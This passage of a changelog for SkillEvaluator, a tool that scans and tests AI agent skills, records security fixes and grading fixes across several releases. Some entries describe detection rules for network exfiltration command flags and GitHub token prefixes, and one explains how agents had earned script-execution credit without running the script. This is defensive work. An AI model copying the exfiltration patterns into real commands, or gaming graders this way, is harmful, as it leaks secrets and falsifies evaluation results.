  shell heredoc, is now a critical `sensitive_file_write` finding whose evidence names the
  protected path, not the patch. Every header in the patch is checked.
- Mask GitHub tokens (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`, and `github_pat_`) in Tier 3
  evidence excerpts and Harbor verifier log output.
- Stop the PII scan reporting User-Agent product versions such as `Chrome/140.0.0.0`
  as public IP addresses. Chromium's reduced User-Agent gives every version this shape.
- Separate Tier 2 collection limits from the 256-file per-skill limit. Fresh
  similarity scans now allow 1,024 selected manifests and 128 million scalar
  comparisons by default, covering 343 skills with 2,048-dimensional embeddings.
  Add `--max-entries` and `--max-scalar-comparisons` for explicit scan budgets;
  exceeded limits fail with actionable errors and never truncate the collection.
  Fresh pairwise scans reject excessive scalar work after the first validated
  embedding response, before requesting more embeddings or saving a catalog.
  Collection discovery has its own 20,000-path ceiling, allowing the supported
  5,000-entry maximum for minimal collections while retaining the 4,096-path
  per-skill ceiling. Invalid Python command API budgets raise option-specific
  errors before provider initialization. Similarity comparisons validate and
  normalize each vector once instead of once per pair, making large pairwise
  scans more than an order of magnitude faster. Equal nonzero embeddings score
  exactly 1.0, so `--threshold 1` reports exact duplicates.
- Keep headings and comments inside fenced code examples in their enclosing Markdown
  section during Tier 2 content chunking, preserving original source line numbers.
- Run the public Docker image as an unprivileged user, with writable default report and home directories.
  Document UID/GID overrides for host-owned output mounts.
- Pin the HTML report Chart.js dependency and verify its integrity before browser execution.

- Preserve full Codex gateway model IDs in cloud environments, including E2B
  and Daytona, while retaining local runtime setup and native provider routing.
- Keep Tier 2 execution diagnostics visible alongside duplicate findings in
  CLI, HTML, and Markdown reports, without repeating the findings as errors.
- Use `nvidia/nemotron-3-super-120b-a12b` as the shared NVIDIA Build default for
  evaluator chat, agent execution, and judging, preserving explicit model overrides.
  Request nonstreaming chat responses explicitly to match the response parser.
- Tier 2 LLM failures now identify the selected provider and model, HTTP status,
  safe error metadata, and failed-cluster count without exposing response bodies.
- Replace the retired NVIDIA embedding default with `nvidia/nemotron-3-embed-1b`
  and send the required passage input type for NVIDIA document comparisons.
  Existing catalogs and caches must be rebuilt when switching embedding models.
- Report Tier 2 embedding and LLM service failures as incomplete checks, retaining
  a nonzero exit without inventing duplicate-content findings. Provider error
  messages include recovery guidance without echoing raw response bodies.
- Tier 3 script execution credit now requires evidence that the expected script
  was invoked. `check_script_execution` previously treated the script name as a
  substring of an execution command, so reading, printing or searching the
  script, or running a similarly named file, scored a full `Executed <script>`.
  Credit is now given only for a recognised invocation: the script run directly,
  an interpreter given it as its script argument, a `source`, or a `sh -c`
  payload that does one of those, with `cd` tracked and script identity compared
  exactly. Interpreter and wrapper options come from grammars derived by running
  each option against a script that records whether it executed, so `--help`,
  `perl -c` and `bash -n` run no script while `python -Wignore` and
  `env FOO=1` still resolve to theirs. A command the walk cannot resolve keeps
  the existing 0.75 partial credit rather than being scored either way: a path
  built at run time, an option outside a grammar, a name only in heredoc data,
  inline code or a module that names the script, and anything reaching a command
  through standard input, including `xargs` and `parallel`, whose behaviour the
  command text never determines. Partial credit is only ever given for a
  command that names the script: an unresolved command that never mentions it
  scores zero, as before. Redirections standing before the script
  (`python3 < /dev/null run.py`), a script's own arguments that look like shell
  options (`bash run.sh -c '...'`), invocations inside `if`, `while`, `until`
  and `for` bodies, and versioned interpreter names (`perl5.38.2`, `python3.13`)
  resolve as the shell runs them. A loop over an empty list keeps the earlier
  binding and its body is not read; a binding made inside `( ... )` stays
  there; the last command of a pipeline keeps its bindings where the shell
  does (zsh, ksh) and not where it forks it (bash, dash, mksh), with an
  option change that could move it (`shopt -s lastpipe`, `emulate sh`)
  read as unresolved; a quoted or escaped word that would read as syntax
  (`'done'`, `printf "("`, `';|'`) is the ordinary word it is; groups and
  compound pipeline stages nest in either order, each compound tested for its
  own pipe; `((` closed by `))` is an arithmetic command where the shell has
  one; the positional
  parameters are empty unless the text gives some, so `for f; do` at the top
  level runs nothing and keeps the variable's value; an interpreter fed its
  program by a pipe (`cat run.py | python3`) is unresolved like
  `python3 < run.py`; a variable bound by `export` or `readonly`, or by
  `declare` and `typeset` where the shell has them, holds the value it had
  when the builtin ran, `unset` empties it, `+x` and `export -n` unexport it
  however the builtin is reached, and one bound from data the text does not
  carry (`read`, `printf -v`, `local` outside a function, `declare -u`, a name
  `eval` may bind, including from a program held in a variable) is
  unresolved, as is a later assignment to a name given `-i`, `-u` or `-n`,
  while `-l` lowercases it and an array is never exported; what is done to a
  `-n` name (`nameref` in ksh and mksh) leaves the name it refers to
  unresolved; `let`, `$((...))` and `$[...]` assign as `((...))` does; an
  assignment the shell rejects (a value that is not a number for an `-i`
  name) and a special builtin given an option the shell rejects end the
  credit where the shell stops there; an assignment written before a command,
  `env NAME=value` included, is that command's environment only, reaching
  neither its own words nor the commands after it, except before a special
  builtin in the POSIX shells; a `-c` payload's shell sees the exported names,
  its command's own prefix and what `env` adds and removes, and a `$` quoted
  or escaped from the outer shell is expanded there (one left unquoted is
  expanded here, a name never bound to nothing), with the payload's own
  heredoc bodies kept as data; text that `eval`, inline
  code or a shell reading a heredoc may expand again is unresolved when a
  variable in it holds the script; every heredoc declared on a line takes its
  body after the line, in order, and past the number a shell accepts on one
  line (16 in bash) the line and the rest are data; a here-string, which dash
  and busybox ash reject before running anything, leaves nothing credited
  under those shells, and so does a compound's opening word written after an
  assignment (`A=1 for ...`, `A=1 if ...`, `A=1 ( ... )`), which every
  modelled shell rejects and which no longer raises; `(((` is a subshell
  around `((` in bash, zsh and mksh; and `ksh`, `mksh` and `ash` are
  recognised shells.
  Applied to both the host checker and the bundled Harbor verifier.

- Added `scripts/script_invocation_differential.py`, a differential harness that
  executes each command for real against fixtures that record whether they ran,
  and compares the result against both implementations. `--baseline REF` also
  scores every command with the checker at an earlier ref and lists each score
  that moved, so a change that lowers a command that ran, or raises one that
  did not, is seen before it is pushed.

### Added

- Interactive top-level help now opens with a green SkillEvaluator wordmark,
  installed version, and tier overview. Narrow terminals use a compact header;
  redirected output and subcommands keep their existing output format.

- OpenAI-compatible gateways now have chat, embedding, and separate Codex,
  Claude Code, and OpenCode model defaults. Set the provider, URL, and key;
  override model IDs when the gateway uses different catalog names. Claude
  Code inherits the gateway route unless an explicit Anthropic route is set.
  Run reports identify harness defaults separately from CLI/config overrides.

- Run individual tiers directly with `skillevaluator tier1 PATH`, `tier2 PATH`,
  and `tier3 PATH`, while retaining the expert subcommands. Tier 1 includes
  dependency checks and enables LLM checks when configured; Tier 2 reports
  whether a catalog comparison ran; Tier 3 creates a missing starter dataset
  and preserves existing evaluation sources.

### Changed

- Show elapsed waiting time during autopilot dataset generation and identify
  deterministic starter datasets used after a provider failure. Fully unscored
  Tier 3 runs show an `INCOMPLETE` summary with coverage, consolidated execution
  errors, and recovery steps; completed comparisons highlight overall Skill
  Lift ([#152](https://github.com/NVIDIA/SkillEvaluator/pull/152)).
- Harden documentation publishing with restricted token permissions, pinned
  checkout and Fern versions, and disabled persisted checkout credentials.
  Apply the checkout credential restriction to DCO checks
  ([#158](https://github.com/NVIDIA/SkillEvaluator/pull/158)).
- Add the methodology paper as the preferred citation and link research,
  developer-blog, and livestream resources from the README
  ([#146](https://github.com/NVIDIA/SkillEvaluator/pull/146),
  [#159](https://github.com/NVIDIA/SkillEvaluator/pull/159)).
- `validate PATH` now runs all three tiers for skills by default. Tier 3
  autopilot reuses an existing evaluation source or creates one starter case
  when none exists. `--full` remains compatible but is unnecessary;
  `--tiers`, `--no-tier3`, and `--no-autopilot` provide explicit scope controls.
  Keyless static CI gates should select `--tiers 1`.
- Tier 3 now selects a provider-native agent when `--agents` is omitted:
  OpenCode for NVIDIA Build, Codex for OpenAI, and Claude Code for Anthropic.
  NVIDIA Build agent runs default to Nemotron Super; explicit agent and model
  overrides remain unchanged.
- Tier 3's extra agent runtime preflight is now disabled by default because it
  executes the first real task prompt and incurs agent runtime and model cost.
  Enable it explicitly with `--agent-runtime-preflight` on either `tier3` or
  `validate`, or with `harbor.agent_runtime_preflight: true` in `evals/config.yml`.
- Missing-provider and API-key errors now show concise, copyable setup steps
  and a link to advanced configuration. Tier 1 also explains `--no-llm`.
- `tier1 validate` now runs only Tier 1, matching `tier1 PATH`. The top-level
  `validate` command retains its combined pipeline behavior.
- README and getting-started guides lead with provider-plus-key setup for
  NVIDIA Build and OpenAI, explain inherited model defaults, and separate
  credentials from scanner and agent runtime requirements.

## 0.3.0 - 2026-09-17

### Added

- Catalog validation now writes `catalog-summary.json` at the reports root with
  per-skill pass/fail status, optional severity rollups from child JSON reports,
  and paths to per-skill report directories.
- Catalog `validate` accepts `--workers N` to validate skills in parallel child
  processes (default 1 preserves the serial per-skill pipeline view).
- `SKILL_EVAL_MODEL_CATALOG_ALLOW_HTTP_HOSTS` names hosts whose model catalog may
  be read over plain HTTP. Catalog reads still require HTTPS for every other
  non-loopback host. Entries match one whole host as written, with no name
  resolution. A plain-HTTP request to an accepted host bypasses any inherited
  HTTP proxy so its bearer token is not offered to an intermediary. The
  transport rechecks authorization before dispatch and rejects hosts that
  are no longer allowed.
- Published benchmark cards record the evaluated source identity. `BENCHMARK.md`
  now carries `Evaluated source`, `Evaluated source revision` and
  `Evaluator container revision` as separate fields, so a reader can tell which
  source tree was evaluated apart from the evaluator build that evaluated it.
  Previously two skills evaluated from different repositories by the same
  evaluator container produced cards whose only recorded revision was the shared
  container tag. `validate` and `tier3 evaluate` take the identity as
  `--evaluated-source-repository`, `--evaluated-source-revision` and
  `--evaluator-container-revision`. `validate` records it on the card and in
  the top-level `evaluated_source` object of its JSON report and forwards it to
  every child of a parallel catalog run; both commands persist it into a Tier 3
  run's `run_config.json`. It can also arrive as the `evaluated_source`
  argument to `build_agent_eval_payload`, as an `evaluated_source` object in the
  run's `run_config.json`, or as `metadata["evaluated_source"]` on any
  validation result. It is never inferred from repository state while rendering,
  because the tree that renders a card is the evaluator checkout rather than the
  evaluated skill's source. Every populated carrier, including the payload of
  every Tier 3 result, is folded into one identity before any report is
  written, so carriers that disagree fail closed with nothing published instead
  of letting result ordering decide which source tree a card claims to describe.
  A revision is accepted only in an unambiguous shape: a full Git object id
  (40 or 64 hex characters), or a digest whose width matches the algorithm it
  names. A container revision is an image reference validated by component (a
  repository path of up to 255 characters, an optional tag of up to 128, and a
  digest at its algorithm's width), so a long repository name is no longer
  discarded. The 255 bound measures the path once the registry host is split
  off it. Path components are lower case, as the OCI grammar requires, while a
  registry host may use any case and is read as a host only when it is
  `localhost`, carries a dot, or carries a port.
  `check_public_benchmarks.py --require-source-provenance` requires the
  fields and fails any card publishing a `PASS` without them, including a
  `PASS` whose evaluator container is named by a mutable tag rather than
  pinned by digest. SkillEvaluator's own CI now runs the scan with that flag;
  it stays opt-in for trees whose cards predate the contract
  ([#72](https://github.com/NVIDIA/SkillEvaluator/issues/72)).
- SARIF 2.1.0 reporter (`-r sarif`) for GitHub Code Scanning and other SARIF
  consumers. Findings map to rule IDs, severity levels, and file locations from
  Tier 1 validation results.

### Fixed

- Fully covered documentation-only skills no longer fail security validation
  solely because non-applicable SkillSpector analyzers report a partial status
  ([#137](https://github.com/NVIDIA/SkillEvaluator/issues/137)).
- Embedding chunking now rejects zero-sized or non-progressing windows before
  entering the splitter or contacting the embedding provider
  ([#139](https://github.com/NVIDIA/SkillEvaluator/issues/139)).
- Scoped network exfiltration command flag patterns in security checks, enforcing command-position anchoring, quote-aware argument segmentation, explicit HTTP method flags, and case-sensitive `-F`/`-d`/`-T` flags to prevent false-positive flags on safe URLs, packages, or download scripts while reliably detecting quoted secrets and subshell wrappers.
- Malformed, non-UTF-8, or unreadable bundled and custom policy files now
  produce path-specific CLI errors instead of leaking raw parser or I/O errors
  ([#128](https://github.com/NVIDIA/SkillEvaluator/issues/128)).
- `create-eval-dataset --refine` resolves Harbor trial case ids from persisted
  `reward.json` `entry_id` metadata, using folder-name parsing only as an
  unambiguous legacy fallback.
- Tier 3 local mode now drops evaluator-managed empty process-loader resets
  while continuing to reject non-empty loader overrides, allowing generated
  tasks to reach agent execution
  ([#132](https://github.com/NVIDIA/SkillEvaluator/issues/132)).
- Unpinned-dependency warnings are no longer suppressed by comparison
  operators inside PEP 508 environment markers; requirements such as
  `pkg; python_version < "3.13"` are now correctly reported, while direct
  references are treated as pinned independently of marker contents.
- Schema, frontmatter, quality parsing, and security PII scanning accept a leading
  UTF-8 BOM, matching the unicode scanner's "benign BOM" note
  ([#91](https://github.com/NVIDIA/SkillEvaluator/issues/91)).
- SPDX headers keep the full license expression, so `MIT OR GPL-3.0` is
  no longer truncated to MIT and allowed. Closing comment markers such as
  `*/` and `-->` are not treated as part of the expression
  ([#86](https://github.com/NVIDIA/SkillEvaluator/issues/86)).
- Windows personal-path PII now flags `C:\Users\...` usernames that start with
  `s` (for example `steve`), matching the intended whitespace class rather than
  excluding the letter `s` ([#87](https://github.com/NVIDIA/SkillEvaluator/issues/87)).
- Quality scoring, script lint, and `create-eval-dataset` now treat `tools/`
  the same as `scripts/` for executable helpers.
- License detection no longer treats a frontmatter `license` identifier as
  authoritative when a LICENSE file declares a different license. Claiming
  MIT while shipping GPL-3.0 now fails closed. Every LICENSE/COPYING file is
  reconciled, NOTICE files stay informational, an unidentified license file is
  not treated as absent, and a blocking conflict no longer publishes
  `license_status=allowed`
  ([#85](https://github.com/NVIDIA/SkillEvaluator/issues/85)).
- `--llm-verify` now refuses to send file context from paths outside the
  skill root, including `..`, absolute paths, and outbound file symlinks.
- Gitleaks path allowlist now skips test/example/fixture/mock directories
  instead of any path containing those substrings, so files like `latest.py`
  are scanned.
- Gitleaks CI now limits pull-request and push scans to history reachable from
  the checked-out commit, while audit events retain all-ref coverage,
  preventing unrelated refs from causing false failures
  ([#106](https://github.com/NVIDIA/SkillEvaluator/pull/106)).
- The Tier 3 agent runtime preflight now fails with an actionable diagnostic when
  the results directory is not visible to the Docker daemon. Previously the smoke
  run passed -- agent output travels over the Docker exec API rather than through
  the mounts -- and every scored trial then failed with `RewardFileNotFoundError`
  while the rewards sat inside the daemon's own filesystem.
- Dead-link validation now uses the shared CommonMark parser, covering
  reference-style and HTML links while preserving Markdown image checks and
  consistently normalizing local destinations. Root-absolute URLs are ignored
  instead of being treated as host paths; href-only diagnostics collapse
  repeated links to the same normalized target. Invalid destination bytes do
  not alias other files, relative URLs that normalize to absolute or
  drive-relative paths are reported without lookup, lookup failures remain
  per-link findings, and link diagnostics are bounded and escaped. Malformed
  frontmatter and repeated unclosed HTML comments no longer abort or stall
  supporting-document checks.
- Tier 3 accuracy and custom goal judges now retry one malformed (including
  empty) or schema-invalid response with a 4096-token output budget before
  failing closed, preventing a transient formatting error from making an otherwise
  successful trial and its full comparison arm unscoreable. Generated and
  injected Harbor verifier configs now reserve 600 seconds for six sequential
  direct provider attempts plus fail-closed artifact writes. Explicit native
  task timeouts remain owner-controlled and are not rewritten, and whole jobs
  defer to Harbor's task-configured phase controls instead of a hidden two-hour
  cap
  ([#70](https://github.com/NVIDIA/SkillEvaluator/issues/70)).
- PII scanning no longer treats Markdown ATX headings as code comments, so
  emails in headings such as `# Contact: ...` are flagged. Hash lines inside
  Python strings, YAML scalars, and shell heredocs are scanned too. Real
  comments stay skipped, including YAML frontmatter, fenced code, and
  `requirements.txt` ([#88](https://github.com/NVIDIA/SkillEvaluator/issues/88)).
- Tier 3 Harbor collection no longer scans an agent's unstructured transcript
  for runtime-error phrases when the recorded exception belongs to the
  verifier, health check, or task. Correct answers that discuss errors such as
  `401 Unauthorized` are no longer misreported as agent runtime failures.
- SkillSpector reports now use validated version-specific completeness
  contracts. Valid findings from coherent 2.10+ partial scans remain visible
  while the result stays incomplete, and fully covered 2.9.5/2.9.6 `--no-llm`
  reports remain compatible. Contradictory finding or component totals and
  duplicate component identities fail closed. Versioned findings require
  producer paths, and complete reports reconcile universal analyzer work with
  the component inventory. Reports scored before 2.10 finding compaction remain
  accepted. Shipped bytecode findings, source-scoped executable evidence, and
  version-specific finding identities remain authoritative without overstating
  compacted or hidden finding evidence. SkillSpector 2.11+ requires bundled
  execution-surface analyzer evidence; 2.11.1+ uses classification-aware
  finding IDs while rejecting conflicting reuse of an ID.
- Tier 3 paired pass@k evidence now respects Python's active integer-string
  conversion limit, preserves nonzero Wilson interval widths and paired-effect
  directions at large case counts, and documents exact-rational omission
  markers.
- Tier 3 now decodes bounded native Codex `exec` wrappers into their static
  tool calls. It preserves call order and outer-call provenance, maps an outer
  observation only when its rendered inner call is known, keeps ambiguous
  observations explicit, and reports unsupported or malformed JavaScript as
  untrusted instead of a clean security result.

## 0.2.1 - 2026-08-24

### Added

- Added a public benchmark publication gate, regression coverage, and a
  documented rollout plan for generated `BENCHMARK.md` cards.
- Tier 3 pass@k results now include per-arm 95% Wilson score intervals and,
  when case identities pair completely, direction-preserving paired outcomes
  with a two-sided exact McNemar diagnostic, its attainable-p resolution limit,
  and the paired pass-rate delta.

### Changed

- Unified Tier 3 scoring around the canonical five dimensions, persisted an
  immutable dataset-truth snapshot with provenance metadata, and redesigned
  `BENCHMARK.md` as a decision-first publication card.
- Updated public OpenAI / Anthropic / Bedrock chat defaults to pinned frontier
  models (`gpt-5.6-sol`, `claude-opus-5`, `us.anthropic.claude-opus-5`),
  centralized in `provider_config`, and documented `gpt-5.4-mini` as the
  lower-cost OpenAI `SKILL_EVAL_LLM_MODEL` alternative. Raised
  dimension/insights judge token budgets to 4096 and widened the gpt-5\*
  temperature guard to bare model IDs.

### Fixed

- Tier 3 now exercises each resolved agent route and the enabled standard-
  grading route against its provider's model catalog before image preparation
  or task staging. Definitive native-provider authentication and deterministic
  Bedrock credential/configuration failures stop immediately with a redacted
  diagnostic. Non-authoritative OpenAI catalog permission/membership results,
  public or compatible catalog success that does not authenticate inference,
  compatible-gateway catalog authentication, transient failures, and native
  Harbor judge selection resolved only at runtime continue as degraded checks.
  Redacted per-route outcomes are retained even when the later agent runtime
  preflight fails ([#71](https://github.com/NVIDIA/SkillEvaluator/issues/71)).
- Tier 3 Harbor collection now accepts the `step_results: null` sentinel
  emitted for successful single-step trials while retaining fail-closed
  validation for malformed non-null multi-step result containers.

- Tier 3 eval-dataset generation now parses `SKILL.md` frontmatter as YAML.
  The previous line-based scan captured block-scalar indicators verbatim, so a
  `description: >-` became the literal string `>-` in every generated prompt,
  and multi-line quoted scalars were silently truncated to their first line.

- GitHub Actions pull request reports now link source targets to the checked-out
  repository revision instead of the synthetic `<number>/merge` ref, preventing
  broken or cross-repository links.
- Tier 3 LLM insights now receive explicit labels and bounded expected-behavior
  context for `expected_skill: null` negative controls, and the judge is
  instructed not to flag unrelated successes without invocation or
  failed-routing evidence.
- Fixed Anthropic API-root normalization across evaluator and Claude Code
  paths, and made required Tier 3 judge failures fail closed instead of
  appearing as numeric zero scores or publishing misleading quality results
  ([#55](https://github.com/NVIDIA/SkillEvaluator/issues/55)).
- Tier 3 now normalizes host-configured `LLM_JUDGE_MODEL` and
  `SKILL_EVAL_JUDGE_MODEL` overrides in Harbor's parent process and forwards
  the selected value through its verifier-only job layer for standard grading.
  This lets native separate-verifier placeholders resolve without injecting
  either name into the evaluated agent's initial environment. Skill-authored
  `runtime_env` and native task `[environment.env]` tables cannot set or alias
  either operator-controlled override.
  Native verifier declarations remain compatible, while the job-level value
  takes precedence during standard grading. Tier 3 results now record the
  configured judge provider, model, source, and whether a dedicated job-wide
  override was applied, separately from agent models. A provider fallback may
  still use a different model for an individual judge call.
- Quality scoring now uses boundary-aware lexical matching and CommonMark-parsed
  structural links instead of hand-written Markdown parsing or regex inference
  of author intent. Deterministic checks no longer infer MCP negation, temporal
  intent, README guidance, or exclusivity from prose;
  use `rubric-eval` for semantic documentation judgments and Tier 3 for
  observed agent behavior.

## 0.2.0 - 2026-08-18

### Security

- Secure Docker exec redaction now ignores environment values shorter than eight
  characters, matching the exact secret length floor used elsewhere. Short
  flags such as `CLAUDE_CODE_DISABLE_POLICY_SKILLS=1` no longer rewrite digits
  in `docker exec` output, which had broken NVIDIA Build bridge loopback
  origins during Tier 3 preflight.

### Changed

- Added explicit `--block-on-dedup` / `--no-block-on-dedup` and
  `--block-on-agent-eval` / `--no-block-on-agent-eval` controls with
  backward-compatible defaults, Tier 3 source preflight, and consistent gating
  metadata across CLI, JSON, Markdown, and HTML reports.
- Reduced pull-request runner use for changes confined to `docs/**` and
  `fern/**`: DCO, Gitleaks, and pinned Fern validation still run, while mixed
  and non-docs changes retain the complete Linux, macOS, Windows, packaging,
  and security matrix. Superseded pull-request CI and security runs are
  cancelled so they do not consume runners after a newer commit is pushed.
  Path classification executes from the pull request base revision so a
  change cannot weaken its own CI routing.

### Fixed

- Quality scoring now uses boundary-aware and context-aware matching for XML tags,
  reserved names, MCP guidance, README references, time references, exclusivity
  language, instruction action verbs, and nested Markdown links, avoiding
  incidental-word score changes.
- Tier 3 generated tasks now stage only an entry's declared `files`, preventing
  undeclared fixtures from the shared `evals/files/` directory from appearing
  in that task's `/workspace/input/`, while preserving copy-all behavior for
  legacy entries that omit the field. Agent-visible target, reference, and
  workspace skill projections now omit evaluator-owned `evals/` directories
  from every staged skill package, including sanitized `--copy-repo` contexts,
  while graders, native tasks, custom
  environments, and declared inputs continue to load from the source dataset.
  Authenticated historical result trees are also excluded after output rotation,
  invalid markers fail closed, and late Codex, Cline, Goose, and Qwen
  skill-discovery roots are reset before agent execution. Pre-upgrade custom
  result roots outside `evals/` have no authenticity marker and cannot be
  distinguished safely from authored runtime content. Move or delete that old
  content before `--copy-repo` or other full-context evaluation, then rerun with
  this version if replacement evidence is needed. Explicit task inputs cannot
  select evaluator-owned datasets, configuration, graders, tests, native tasks,
  environments, or results. Every agent and baseline arm now reads from one
  private, selective evaluator snapshot containing the active control files,
  task-source data, consumed fixtures and grader, and the complete authored
  custom environment. Legacy omitted-file entries retain the full shared files
  corpus. Unrelated evaluator subtrees and generated results stay outside the
  snapshot. MCP configuration and completed-run artifacts are
  read through bounded descriptor-anchored roots; on Windows, selected file
  handles deny concurrent writes and deletes while live. Historical unmarked
  runs created before canonical run-level `result.json` remain discoverable only
  when their stable configuration and summaries satisfy the complete historical
  schema. Pre-status scored summaries remain consumable, coherent status-era
  failures remain visible without contributing scores, and marked current
  partial runs continue to fail closed.
- Tier 2 scans now validate but do not follow the exact contained
  `CLAUDE.md -> AGENTS.md` compatibility alias, scanning the exactly named,
  independently discovered, single-link regular target once while continuing
  to reject hard-linked selected files, linked manifests, directories, and all
  other file redirects.

## 0.1.0 - 2026-08-05

### Added

- CI DCO check that fails pull requests whose commits lack a `Signed-off-by`
  trailer, matching the sign-off requirement in `CONTRIBUTING.md`.
- Initial public release candidate.
- Enabled optional semantic-version validation in the default Tier 1 pipeline,
  including a public `--previous-version` monotonic-bump bound.

- Added NVIDIA Build live-agent paths: direct OpenCode support plus Docker
  compatibility bridges for Codex and experimental Claude Code, including
  multi-turn tool-call continuation.
- Fern documentation site configured for `docs.nvidia.com/skills/skillevaluator`,
  building the `docs/` guides (installation, configuration, and the three
  evaluation tiers) as MDX pages.
- Expanded the documentation site to fifteen pages — quickstart, eval
  datasets, agents and sandboxes, custom graders, reports, CI integration,
  CLI reference, and environment variables — under a task-oriented
  navigation, with every command verified against the current CLI.

### Security

- Isolated NVIDIA Build bridge credentials from vendor CLI processes using a
  transient, root-managed, container-only key handoff with cleanup on failure.
- Removed NVIDIA Build secrets from Harbor and Docker exec arguments using a
  host-only key file, a non-secret subprocess sentinel, and per-exec container
  handoffs; provider-secret aliases in `runtime_env` are rejected.
- Hardened compatibility-bridge startup with a dynamic loopback port and
  authenticated, process-bound readiness instead of a fixed health endpoint.
- Tightened local macOS Seatbelt policy so nested workspaces can traverse home
  directory metadata without gaining directory-listing or sibling-file access.
- Removed implicit host-side pytest execution from default Tier 1
  code-integrity validation. Test evidence is now collected with contained,
  filename-only discovery that does not import or execute target-controlled
  Python code.

### Changed

- Simplified the repository README into a concise documentation landing page,
  retained a compact keyless `validate` quickstart, LLM-provider setup, and a
  one-command `validate --full` path through all three tiers, broadened the
  project description to agent artifacts starting with agent skills, and moved
  detailed guidance to `docs.nvidia.com/skills/skillevaluator`.
- Added Tier 3 cost-planning guidance, including trial-volume multipliers,
  cost-saving flags, and the cost and isolation tradeoffs of local mode.
- Standardized the product name as `SkillEvaluator` across documentation,
  repository metadata, CLI output, and generated report artifacts.
- Removed the optional OpenTelemetry integration, the
  `skillevaluator[telemetry]` extra, and the `skillevaluator.telemetry` Python
  module from the public distribution. Imports of that module now fail rather
  than providing the former telemetry and safety helpers. Redaction and
  child-process environment filtering remain available from
  `skillevaluator.utils.redaction` and
  `skillevaluator.utils.process_environment`; direct Protobuf and OpenTelemetry
  dependencies are no longer installed.
- Changed the public OpenAI default to `gpt-5.4-mini` and the NVIDIA Build
  default to `nvidia/nemotron-3-nano-30b-a3b`; OpenCode, Codex, and experimental
  Claude Code now resolve that Build default without redundant model flags.
- Tier 3 now streams staging, arm submission, completion, failure, collection,
  and report-writing progress instead of appearing idle during Harbor startup.
- Tier 3 now reports structured agent/provider failures such as NVIDIA Build
  capacity exhaustion instead of scoring a no-trajectory fallback or emitting
  a generated Harbor task-name mismatch.
- Replaced provisional `test_coverage`, `tests`, and `coverage_percent` output
  with one `test_discovery` detail. Reports now include `test_count`, supported
  filename patterns, `execution_performed=false`, and
  `coverage_measured=false`; projects must run tests and measure coverage in a
  trusted environment or explicit sandbox.

### Fixed

- Public benchmark cards now omit policy profiles, redact absolute host paths,
  and normalize imported internal or retired metadata before publication.
- Previous-version validation now rejects catalog-wide scalar reuse and removal
  of an already bounded `metadata.version` label.
- Tier 1 and Tier 2 now ignore only the exact public SPDX metadata preamble,
  distinguish package versions from network addresses, recognize canonical
  `agents/` and `tests/` support directories, and keep Ruff on the validated
  0.15 release line.
- Accepted structurally complete SkillSpector finding reports on policy exit 1
  and hardened validation of the external scanner's untrusted JSON contract;
  SkillSpector remains separately installed and unpinned by this distribution.
- Programmatic dataset generation now returns explicit created, preview, and
  unchanged outcomes, preserves actionable failures, and no longer mutates
  process-wide command-line arguments.
- Security and full-feature installs now work on RHEL 8 and other glibc 2.28
  Linux systems by keeping Semgrep and SkillSpector in separate tool
  environments while retaining compatible bundled Python dependencies.
- Tier 2 content collection now prunes configured evaluation and version
  artifact directories before enforcing the discovered-path limit, so excluded
  generated results cannot cause false path-count failures.
